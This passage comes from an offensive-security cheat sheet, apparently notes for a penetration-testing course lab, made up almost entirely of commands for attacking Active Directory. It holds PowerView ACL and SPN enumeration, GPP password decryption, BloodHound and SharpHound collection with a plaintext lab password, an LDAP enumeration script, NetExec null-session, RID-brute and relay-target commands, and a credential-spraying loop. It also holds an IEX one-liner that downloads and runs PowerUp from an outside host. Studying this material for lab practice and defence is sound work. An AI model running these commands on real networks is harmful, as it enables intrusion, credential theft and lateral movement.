</span><span id="__span-72-38"><a id="__codelineno-72-38" name="__codelineno-72-38" href="#__codelineno-72-38"></a><span class="nb">Get-NetUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span>  <span class="c"># powerview</span>
</span><span id="__span-72-39"><a id="__codelineno-72-39" name="__codelineno-72-39" href="#__codelineno-72-39"></a>
</span><span id="__span-72-40"><a id="__codelineno-72-40" name="__codelineno-72-40" href="#__codelineno-72-40"></a><span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="n">stephanie</span> <span class="c">#  ActiveDirectoryRights and SecurityIdentifier, interesting to look for who has what perms on specfied object in this case stephanie user object</span>
</span><span id="__span-72-41"><a id="__codelineno-72-41" name="__codelineno-72-41" href="#__codelineno-72-41"></a><span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&quot;Management Department&quot;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-eq</span> <span class="s2">&quot;GenericAll&quot;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SecurityIdentifier</span><span class="p">,</span><span class="n">ActiveDirectoryRights</span>
</span><span id="__span-72-42"><a id="__codelineno-72-42" name="__codelineno-72-42" href="#__codelineno-72-42"></a>
</span><span id="__span-72-43"><a id="__codelineno-72-43" name="__codelineno-72-43" href="#__codelineno-72-43"></a><span class="nb">Convert-SidToName</span> <span class="p">&lt;</span><span class="n">sid</span><span class="p">&gt;</span>
</span><span id="__span-72-44"><a id="__codelineno-72-44" name="__codelineno-72-44" href="#__codelineno-72-44"></a><span class="s2">&quot;S-1-5-21-1987370270-658905905-1781884369-512&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-21-1987370270-658905905-1781884369-1104&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-32-548&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-18&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-21-1987370270-658905905-1781884369-519&quot;</span> <span class="p">|</span> <span class="nb">Convert-SidToName</span>
</span><span id="__span-72-45"><a id="__codelineno-72-45" name="__codelineno-72-45" href="#__codelineno-72-45"></a>
</span><span id="__span-72-46"><a id="__codelineno-72-46" name="__codelineno-72-46" href="#__codelineno-72-46"></a>
</span><span id="__span-72-47"><a id="__codelineno-72-47" name="__codelineno-72-47" href="#__codelineno-72-47"></a><span class="c"># Oneliner</span>
</span><span id="__span-72-48"><a id="__codelineno-72-48" name="__codelineno-72-48" href="#__codelineno-72-48"></a><span class="nb">Get-ObjectAcl</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ObjectDN</span><span class="p">,</span> <span class="n">ObjectSID</span><span class="p">,</span> <span class="n">ActiveDirectoryRights</span><span class="p">,</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s1">&#39;IdentityReference&#39;</span><span class="p">;</span> <span class="n">Expression</span><span class="p">={</span><span class="nb">ConvertFrom-SID</span> <span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span><span class="p">}}</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-like</span> <span class="s1">&#39;*user*&#39;</span><span class="p">}</span>
</span><span id="__span-72-49"><a id="__codelineno-72-49" name="__codelineno-72-49" href="#__codelineno-72-49"></a>
</span><span id="__span-72-50"><a id="__codelineno-72-50" name="__codelineno-72-50" href="#__codelineno-72-50"></a><span class="c"># If we have GenericAll on the group then we can add any user in that group</span>
</span><span id="__span-72-51"><a id="__codelineno-72-51" name="__codelineno-72-51" href="#__codelineno-72-51"></a>
</span><span id="__span-72-52"><a id="__codelineno-72-52" name="__codelineno-72-52" href="#__codelineno-72-52"></a><span class="c"># for gpo fidning</span>
</span><span id="__span-72-53"><a id="__codelineno-72-53" name="__codelineno-72-53" href="#__codelineno-72-53"></a><span class="nb">Get-NetGPO</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span><span id="__span-72-54"><a id="__codelineno-72-54" name="__codelineno-72-54" href="#__codelineno-72-54"></a><span class="nb">Get-GPO</span> <span class="n">-Name</span> <span class="s2">&quot;Default Domain Policy&quot;</span>
</span><span id="__span-72-55"><a id="__codelineno-72-55" name="__codelineno-72-55" href="#__codelineno-72-55"></a>
</span><span id="__span-72-56"><a id="__codelineno-72-56" name="__codelineno-72-56" href="#__codelineno-72-56"></a><span class="nb">Find-DomainShare</span>  <span class="c"># -CheckShareAccess to list shares that available to us</span>
</span><span id="__span-72-57"><a id="__codelineno-72-57" name="__codelineno-72-57" href="#__codelineno-72-57"></a><span class="c"># SYSVOL share, located on domain controllers, stores domain-wide policies and logon scripts. It is accessible to all domain users to ensure that these policies are propagated across all domain-joined systems. </span>
</span><span id="__span-72-58"><a id="__codelineno-72-58" name="__codelineno-72-58" href="#__codelineno-72-58"></a><span class="nb">ls </span><span class="p">\\</span><span class="n">dc1</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">\</span><span class="n">sysvol</span><span class="p">\</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">\</span>   <span class="c"># investigate all folders can lead to sensitive info like gpp password</span>
</span><span id="__span-72-59"><a id="__codelineno-72-59" name="__codelineno-72-59" href="#__codelineno-72-59"></a><span class="n">gpp-decrypt</span> <span class="s2">&quot;+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE&quot;</span>
</span><span id="__span-72-60"><a id="__codelineno-72-60" name="__codelineno-72-60" href="#__codelineno-72-60"></a>
</span><span id="__span-72-61"><a id="__codelineno-72-61" name="__codelineno-72-61" href="#__codelineno-72-61"></a><span class="c"># Powerview cmds END]</span>
</span><span id="__span-72-62"><a id="__codelineno-72-62" name="__codelineno-72-62" href="#__codelineno-72-62"></a>
</span><span id="__span-72-63"><a id="__codelineno-72-63" name="__codelineno-72-63" href="#__codelineno-72-63"></a>
</span><span id="__span-72-64"><a id="__codelineno-72-64" name="__codelineno-72-64" href="#__codelineno-72-64"></a><span class="n">gpresult</span> <span class="p">/</span><span class="n">S</span> <span class="n">SERVER01</span> <span class="p">/</span><span class="n">USER</span> <span class="n">CORP</span><span class="p">\</span><span class="n">dave</span> <span class="p">/</span><span class="nb">R</span>
</span><span id="__span-72-65"><a id="__codelineno-72-65" name="__codelineno-72-65" href="#__codelineno-72-65"></a>
</span><span id="__span-72-66"><a id="__codelineno-72-66" name="__codelineno-72-66" href="#__codelineno-72-66"></a>
</span><span id="__span-72-67"><a id="__codelineno-72-67" name="__codelineno-72-67" href="#__codelineno-72-67"></a><span class="c"># AUTOMATED TOOLS</span>
</span><span id="__span-72-68"><a id="__codelineno-72-68" name="__codelineno-72-68" href="#__codelineno-72-68"></a>
</span><span id="__span-72-69"><a id="__codelineno-72-69" name="__codelineno-72-69" href="#__codelineno-72-69"></a><span class="n">bloodhound-python</span> <span class="c"># compatible for bloodhound legacy</span>
</span><span id="__span-72-70"><a id="__codelineno-72-70" name="__codelineno-72-70" href="#__codelineno-72-70"></a><span class="n">pipx</span> <span class="n">install</span> <span class="n">bloodhound-ce</span> 
</span><span id="__span-72-71"><a id="__codelineno-72-71" name="__codelineno-72-71" href="#__codelineno-72-71"></a><span class="n">bloodhound-ce-python</span> <span class="c"># compatible for bloodhound ce</span>
</span><span id="__span-72-72"><a id="__codelineno-72-72" name="__codelineno-72-72" href="#__codelineno-72-72"></a>
</span><span id="__span-72-73"><a id="__codelineno-72-73" name="__codelineno-72-73" href="#__codelineno-72-73"></a><span class="c"># Try to use sharphound too, because it misses some details</span>
</span><span id="__span-72-74"><a id="__codelineno-72-74" name="__codelineno-72-74" href="#__codelineno-72-74"></a><span class="n">bloodhound-ce-python</span> <span class="n">-u</span> <span class="n">stephanie</span> <span class="n">-p</span> <span class="s1">&#39;LegmanTeamBenzoin!!&#39;</span> <span class="n">-d</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="n">-v</span> <span class="p">-</span><span class="n">-zip</span> <span class="n">-c</span> <span class="n">All</span><span class="p">,</span><span class="n">LoggedOn</span> <span class="n">-gc</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="n">-ns</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">105</span><span class="p">.</span><span class="n">70</span>
</span><span id="__span-72-75"><a id="__codelineno-72-75" name="__codelineno-72-75" href="#__codelineno-72-75"></a><span class="c"># LoggedOn isn&#39;t included inside All collection</span>
</span><span id="__span-72-76"><a id="__codelineno-72-76" name="__codelineno-72-76" href="#__codelineno-72-76"></a>
</span><span id="__span-72-77"><a id="__codelineno-72-77" name="__codelineno-72-77" href="#__codelineno-72-77"></a>
</span><span id="__span-72-78"><a id="__codelineno-72-78" name="__codelineno-72-78" href="#__codelineno-72-78"></a>
</span><span id="__span-72-79"><a id="__codelineno-72-79" name="__codelineno-72-79" href="#__codelineno-72-79"></a><span class="c"># [sharphound](https://github.com/SpecterOps/SharpHound/releases)</span>
</span><span id="__span-72-80"><a id="__codelineno-72-80" name="__codelineno-72-80" href="#__codelineno-72-80"></a><span class="p">.</span> <span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-72-81"><a id="__codelineno-72-81" name="__codelineno-72-81" href="#__codelineno-72-81"></a><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="n">-OutputDirectory</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">stephanie</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span> <span class="n">-OutputPrefix</span> <span class="s2">&quot;corp audit&quot;</span>
</span><span id="__span-72-82"><a id="__codelineno-72-82" name="__codelineno-72-82" href="#__codelineno-72-82"></a>
</span><span id="__span-72-83"><a id="__codelineno-72-83" name="__codelineno-72-83" href="#__codelineno-72-83"></a><span class="c"># analysis of collected data </span>
</span><span id="__span-72-84"><a id="__codelineno-72-84" name="__codelineno-72-84" href="#__codelineno-72-84"></a><span class="nb">curl </span><span class="n">-L</span> <span class="n">https</span><span class="p">://</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">SpecterOps</span><span class="p">/</span><span class="n">bloodhound</span><span class="p">/</span><span class="n">main</span><span class="p">/</span><span class="n">examples</span><span class="p">/</span><span class="n">docker-compose</span><span class="p">/</span><span class="n">docker-compose</span><span class="p">.</span><span class="n">yml</span> <span class="p">&gt;</span> <span class="n">docker-compose</span><span class="p">.</span><span class="n">yml</span>
</span><span id="__span-72-85"><a id="__codelineno-72-85" name="__codelineno-72-85" href="#__codelineno-72-85"></a><span class="n">sudo</span> <span class="n">docker-compose</span> <span class="n">pull</span> <span class="p">&amp;&amp;</span> <span class="n">sudo</span> <span class="n">docker-compose</span> <span class="n">up</span>
</span><span id="__span-72-86"><a id="__codelineno-72-86" name="__codelineno-72-86" href="#__codelineno-72-86"></a><span class="c"># cypher queries [Reference1](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) </span>
</span><span id="__span-72-87"><a id="__codelineno-72-87" name="__codelineno-72-87" href="#__codelineno-72-87"></a><span class="c"># Example cypher query</span>
</span><span id="__span-72-88"><a id="__codelineno-72-88" name="__codelineno-72-88" href="#__codelineno-72-88"></a><span class="n">MATCH</span> <span class="p">(</span><span class="n">n</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="nb">WHERE </span><span class="n">n</span><span class="p">.</span><span class="n">hasspn</span><span class="p">=</span><span class="n">true</span>
</span><span id="__span-72-89"><a id="__codelineno-72-89" name="__codelineno-72-89" href="#__codelineno-72-89"></a><span class="k">RETURN</span> <span class="n">n</span>
</span><span id="__span-72-90"><a id="__codelineno-72-90" name="__codelineno-72-90" href="#__codelineno-72-90"></a>
</span><span id="__span-72-91"><a id="__codelineno-72-91" name="__codelineno-72-91" href="#__codelineno-72-91"></a><span class="n">MATCH</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)-[:</span><span class="n">HasSession</span><span class="p">]-&gt;(</span><span class="n">m</span><span class="p">:</span><span class="n">User</span><span class="p">)</span> <span class="k">RETURN</span> <span class="n">p</span>
</span><span id="__span-72-92"><a id="__codelineno-72-92" name="__codelineno-72-92" href="#__codelineno-72-92"></a>
</span><span id="__span-72-93"><a id="__codelineno-72-93" name="__codelineno-72-93" href="#__codelineno-72-93"></a><span class="c"># BloodHound enumerates local admin access only from the perspective of the user used during data collection. To discover additional access paths after pivoting to another user, data must be recollected using that new context.</span>
</span><span id="__span-72-94"><a id="__codelineno-72-94" name="__codelineno-72-94" href="#__codelineno-72-94"></a>
</span><span id="__span-72-95"><a id="__codelineno-72-95" name="__codelineno-72-95" href="#__codelineno-72-95"></a><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-e</span> <span class="n">bypass</span> <span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">New</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.x.x/powerup.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-AllChecks</span> <span class="p">&gt;</span> <span class="n">output-powerup</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div>
<h4 id="ad-enumeration-script">ad-enumeration-script</h4>
<p>this custom script can helps us find nested groups. <code>net group gropuname /domain</code> only lists the user, groups that are member of the mentioned group.
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="nv">$PDC</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">().</span><span class="n">PdcRoleOwner</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a><span class="nv">$DN</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span> 
</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a><span class="nv">$LDAP</span> <span class="p">=</span> <span class="s2">&quot;LDAP://$PDC/$DN&quot;</span>
</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a>
</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a><span class="nv">$direntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="nv">$LDAP</span><span class="p">)</span>
</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a>
</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a><span class="nv">$dirsearcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="nv">$direntry</span><span class="p">)</span>
</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a>
</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a><span class="c"># to filter for the domain users only</span>
</span><span id="__span-73-10"><a id="__codelineno-73-10" name="__codelineno-73-10" href="#__codelineno-73-10"></a><span class="nv">$dirsearcher</span><span class="p">.</span><span class="k">filter</span><span class="p">=</span><span class="s2">&quot;samAccountType=805306368&quot;</span>
</span><span id="__span-73-11"><a id="__codelineno-73-11" name="__codelineno-73-11" href="#__codelineno-73-11"></a><span class="c"># to filter specific user only</span>
</span><span id="__span-73-12"><a id="__codelineno-73-12" name="__codelineno-73-12" href="#__codelineno-73-12"></a><span class="c"># $dirsearcher.filter=&quot;name=jeffadmin&quot;</span>
</span><span id="__span-73-13"><a id="__codelineno-73-13" name="__codelineno-73-13" href="#__codelineno-73-13"></a>
</span><span id="__span-73-14"><a id="__codelineno-73-14" name="__codelineno-73-14" href="#__codelineno-73-14"></a>
</span><span id="__span-73-15"><a id="__codelineno-73-15" name="__codelineno-73-15" href="#__codelineno-73-15"></a><span class="nv">$result</span> <span class="p">=</span> <span class="nv">$dirsearcher</span><span class="p">.</span><span class="n">FindAll</span><span class="p">()</span>
</span><span id="__span-73-16"><a id="__codelineno-73-16" name="__codelineno-73-16" href="#__codelineno-73-16"></a>
</span><span id="__span-73-17"><a id="__codelineno-73-17" name="__codelineno-73-17" href="#__codelineno-73-17"></a><span class="k">Foreach</span><span class="p">(</span><span class="nv">$obj</span> <span class="k">in</span> <span class="nv">$result</span><span class="p">)</span>
</span><span id="__span-73-18"><a id="__codelineno-73-18" name="__codelineno-73-18" href="#__codelineno-73-18"></a><span class="p">{</span>
</span><span id="__span-73-19"><a id="__codelineno-73-19" name="__codelineno-73-19" href="#__codelineno-73-19"></a>    <span class="k">Foreach</span><span class="p">(</span><span class="nv">$prop</span> <span class="k">in</span> <span class="nv">$obj</span><span class="p">.</span><span class="n">Properties</span><span class="p">)</span>
</span><span id="__span-73-20"><a id="__codelineno-73-20" name="__codelineno-73-20" href="#__codelineno-73-20"></a>    <span class="p">{</span>
</span><span id="__span-73-21"><a id="__codelineno-73-21" name="__codelineno-73-21" href="#__codelineno-73-21"></a>        <span class="nv">$prop</span>
</span><span id="__span-73-22"><a id="__codelineno-73-22" name="__codelineno-73-22" href="#__codelineno-73-22"></a>    <span class="p">}</span>
</span><span id="__span-73-23"><a id="__codelineno-73-23" name="__codelineno-73-23" href="#__codelineno-73-23"></a>
</span><span id="__span-73-24"><a id="__codelineno-73-24" name="__codelineno-73-24" href="#__codelineno-73-24"></a>    <span class="nb">Write-Host</span> <span class="s2">&quot;-------------------------------&quot;</span>
</span><span id="__span-73-25"><a id="__codelineno-73-25" name="__codelineno-73-25" href="#__codelineno-73-25"></a><span class="p">}</span>
</span><span id="__span-73-26"><a id="__codelineno-73-26" name="__codelineno-73-26" href="#__codelineno-73-26"></a>
</span><span id="__span-73-27"><a id="__codelineno-73-27" name="__codelineno-73-27" href="#__codelineno-73-27"></a><span class="c"># proper ldap query code using powershell</span>
</span><span id="__span-73-28"><a id="__codelineno-73-28" name="__codelineno-73-28" href="#__codelineno-73-28"></a><span class="k">function</span> <span class="n">LDAPSearch</span> <span class="p">{</span>
</span><span id="__span-73-29"><a id="__codelineno-73-29" name="__codelineno-73-29" href="#__codelineno-73-29"></a> <span class="c"># example Usage: LDAPSearch -LDAPQuery &quot;(objectclass=group)&quot; </span>
</span><span id="__span-73-30"><a id="__codelineno-73-30" name="__codelineno-73-30" href="#__codelineno-73-30"></a> <span class="c"># LDAPSearch -LDAPQuery &quot;(samAccountType=805306368)&quot;</span>
</span><span id="__span-73-31"><a id="__codelineno-73-31" name="__codelineno-73-31" href="#__codelineno-73-31"></a> <span class="c"># &quot;(&amp;(objectCategory=group)(cn=Development Department*))&quot;</span>
</span><span id="__span-73-32"><a id="__codelineno-73-32" name="__codelineno-73-32" href="#__codelineno-73-32"></a>    <span class="k">param</span> <span class="p">(</span>
</span><span id="__span-73-33"><a id="__codelineno-73-33" name="__codelineno-73-33" href="#__codelineno-73-33"></a>        <span class="no">[string]</span><span class="nv">$LDAPQuery</span>
</span><span id="__span-73-34"><a id="__codelineno-73-34" name="__codelineno-73-34" href="#__codelineno-73-34"></a>    <span class="p">)</span>
</span><span id="__span-73-35"><a id="__codelineno-73-35" name="__codelineno-73-35" href="#__codelineno-73-35"></a>
</span><span id="__span-73-36"><a id="__codelineno-73-36" name="__codelineno-73-36" href="#__codelineno-73-36"></a>    <span class="nv">$PDC</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">().</span><span class="n">PdcRoleOwner</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-73-37"><a id="__codelineno-73-37" name="__codelineno-73-37" href="#__codelineno-73-37"></a>    <span class="nv">$DistinguishedName</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span>
</span><span id="__span-73-38"><a id="__codelineno-73-38" name="__codelineno-73-38" href="#__codelineno-73-38"></a>
</span><span id="__span-73-39"><a id="__codelineno-73-39" name="__codelineno-73-39" href="#__codelineno-73-39"></a>    <span class="nv">$DirectoryEntry</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span><span class="p">(</span><span class="s2">&quot;LDAP://$PDC/$DistinguishedName&quot;</span><span class="p">)</span>
</span><span id="__span-73-40"><a id="__codelineno-73-40" name="__codelineno-73-40" href="#__codelineno-73-40"></a>    <span class="c"># in case of doing enumeration from the other user perspective</span>
</span><span id="__span-73-41"><a id="__codelineno-73-41" name="__codelineno-73-41" href="#__codelineno-73-41"></a>    <span class="c"># $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry($SearchString, &quot;pete&quot;, &quot;Nexus123!&quot;)</span>
</span><span id="__span-73-42"><a id="__codelineno-73-42" name="__codelineno-73-42" href="#__codelineno-73-42"></a>    <span class="nv">$DirectorySearcher</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="nv">$DirectoryEntry</span><span class="p">,</span> <span class="nv">$LDAPQuery</span><span class="p">)</span>
</span><span id="__span-73-43"><a id="__codelineno-73-43" name="__codelineno-73-43" href="#__codelineno-73-43"></a>
</span><span id="__span-73-44"><a id="__codelineno-73-44" name="__codelineno-73-44" href="#__codelineno-73-44"></a>    <span class="k">return</span> <span class="nv">$DirectorySearcher</span><span class="p">.</span><span class="n">FindAll</span><span class="p">()</span>
</span><span id="__span-73-45"><a id="__codelineno-73-45" name="__codelineno-73-45" href="#__codelineno-73-45"></a>
</span><span id="__span-73-46"><a id="__codelineno-73-46" name="__codelineno-73-46" href="#__codelineno-73-46"></a><span class="p">}</span>
</span><span id="__span-73-47"><a id="__codelineno-73-47" name="__codelineno-73-47" href="#__codelineno-73-47"></a>
</span><span id="__span-73-48"><a id="__codelineno-73-48" name="__codelineno-73-48" href="#__codelineno-73-48"></a><span class="c"># we can use for loop to easily print the output</span>
</span><span id="__span-73-49"><a id="__codelineno-73-49" name="__codelineno-73-49" href="#__codelineno-73-49"></a><span class="k">foreach</span> <span class="p">(</span><span class="nv">$group</span> <span class="k">in</span> <span class="p">$(</span><span class="n">LDAPSearch</span> <span class="n">-LDAPQuery</span> <span class="s2">&quot;(objectCategory=group)&quot;</span><span class="p">))</span> <span class="p">{</span>
</span><span id="__span-73-50"><a id="__codelineno-73-50" name="__codelineno-73-50" href="#__codelineno-73-50"></a>    <span class="nv">$group</span><span class="p">.</span><span class="n">properties</span> <span class="p">|</span> <span class="nb">select </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">cn</span><span class="p">},</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">member</span><span class="p">}</span>
</span><span id="__span-73-51"><a id="__codelineno-73-51" name="__codelineno-73-51" href="#__codelineno-73-51"></a><span class="p">}</span>
</span></code></pre></div></p>
<h4 id="netexec"><a href="https://www.netexec.wiki/">Netexec</a></h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="c1"># SMB enumeration</span>
</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;iprange&gt;<span class="w">  </span><span class="c1"># only search for windows machine</span>
</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ipraneg&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares<span class="w"> </span><span class="c1"># to look for null session</span>
</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;iprange&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;guest&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>
</span><span id="__span-74-6"><a id="__codelineno-74-6" name="__codelineno-74-6" href="#__codelineno-74-6"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-M<span class="w"> </span>spider_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">DOWNLOAD_FLAG</span><span class="o">=</span>True<span class="w"> </span><span class="c1"># to download all the file from smb shares</span>
</span><span id="__span-74-7"><a id="__codelineno-74-7" name="__codelineno-74-7" href="#__codelineno-74-7"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w">  </span>--user<span class="w"> </span><span class="c1"># try enumerate thru guest user and null session</span>
</span><span id="__span-74-8"><a id="__codelineno-74-8" name="__codelineno-74-8" href="#__codelineno-74-8"></a>
</span><span id="__span-74-9"><a id="__codelineno-74-9" name="__codelineno-74-9" href="#__codelineno-74-9"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>--users
</span><span id="__span-74-10"><a id="__codelineno-74-10" name="__codelineno-74-10" href="#__codelineno-74-10"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>--rid-brute<span class="w"> </span><span class="c1"># to enumerate users using rid bruteforcing</span>
</span><span id="__span-74-11"><a id="__codelineno-74-11" name="__codelineno-74-11" href="#__codelineno-74-11"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>UserNAme<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;PASSWORDHERE&#39;</span><span class="w"> </span>--pass-pol<span class="w"> </span><span class="c1"># domain pass policy</span>
</span><span id="__span-74-12"><a id="__codelineno-74-12" name="__codelineno-74-12" href="#__codelineno-74-12"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>--gen-relay-list<span class="w"> </span>relay_list.txt<span class="w"> </span><span class="c1"># to check which target hasn&#39;t enforced smb signing so we can relay ntml</span>
</span><span id="__span-74-13"><a id="__codelineno-74-13" name="__codelineno-74-13" href="#__codelineno-74-13"></a>
</span><span id="__span-74-14"><a id="__codelineno-74-14" name="__codelineno-74-14" href="#__codelineno-74-14"></a><span class="c1"># Spray valid credentials: smb, rdp and winrm</span>
</span><span id="__span-74-15"><a id="__codelineno-74-15" name="__codelineno-74-15" href="#__codelineno-74-15"></a><span class="k">while</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span>:<span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>u<span class="w"> </span>p<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.0/24<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$u</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$p</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span>&lt;<span class="w"> </span>&lt;<span class="o">(</span>cat<span class="w"> </span>credentials.txt<span class="o">)</span>
</span><span id="__span-74-16"><a id="__codelineno-74-16" name="__codelineno-74-16" href="#__codelineno-74-16"></a>
</span><span id="__span-74-17"><a id="__codelineno-74-17" name="__codelineno-74-17" href="#__codelineno-74-17"></a>
